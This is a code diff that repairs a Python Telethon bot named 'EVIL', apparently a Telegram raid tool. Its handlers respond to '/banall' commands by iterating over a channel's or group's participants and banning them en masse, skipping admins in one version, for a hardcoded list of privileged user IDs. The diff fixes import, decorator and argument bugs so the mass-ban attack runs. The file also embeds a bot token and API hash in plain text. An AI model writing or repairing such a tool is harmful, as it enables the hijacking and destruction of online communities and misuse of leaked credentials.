@@ -1,14 +1,8 @@
 import logging
 from decouple import config
-from os import getenv
-from telethon import TelegramClient, events
 from telethon.sync import TelegramClient, events
 from telethon.tl.functions.channels import EditBannedRequest
 from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
-from telethon.tl.types import (
-    ChannelParticipantsAdmins,
-    ChatBannedRights,
-)
 
 BOT_TOKEN = config("BOT_TOKEN", "6841919421:AAH6ZVh7we0heNEk4w9tALRunN79GBhzTos")
 EVILS = [6446763201, 5881613383]
@@ -18,7 +12,6 @@ SUDO_USERS = list(map(int, sudo_users_str.split()))
 
 # Add your ID to the SUDO_USERS list
 SUDO_USERS.append(6446763201)
-
 
 RIGHTS = ChatBannedRights(
     until_date=None,
@@ -33,23 +26,21 @@ RIGHTS = ChatBannedRights(
 )
 
 logging.basicConfig(level=logging.INFO)
-Evil = TelegramClient('EVIL', 22418774, "d8c8dab274f9a811814a6a96d044028e").start(bot_token=BOT_TOKEN)
+client = TelegramClient('EVIL', 22418774, "d8c8dab274f9a811814a6a96d044028e").start(bot_token=BOT_TOKEN)
 
-@client.on(events.NewMessage(pattern=r'/bamall -\d+', chats=None))
+@client.on(events.NewMessage(pattern=r'/banall -\d+', chats=None))
 async def ban_all(event):
     channel_id = int(event.text.split()[1])  # Extract channel ID from the command
     async for user in client.iter_participants(channel_id):
         try:
-            await client(EditBannedRequest(channel_id, user, banned_rights=True))
+            await client(EditBannedRequest(channel_id, user.id, RIGHTS))
             print(f"Banned user: {user.id}")
         except Exception as e:
             print(f"Error banning user {user.id}: {e}")
 
-client.run_until_disconnected()
-
-@Evil.on(events.NewMessage(pattern="^/banall"))
+@client.on(events.NewMessage(pattern="^/banall"))
 async def banall(event):
-   if event.sender_id in SUDO_USERS:
+    if event.sender_id in SUDO_USERS:
         await event.delete()
         admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
         admins_id = [i.id for i in admins]
@@ -66,7 +57,7 @@ async def banall(event):
             except Exception as e:
                 pass
 
-
 print("TEAM LEGENDZ OP")
 
-Evil.run_until_disconnected()
+client.run_until_disconnected()
+    
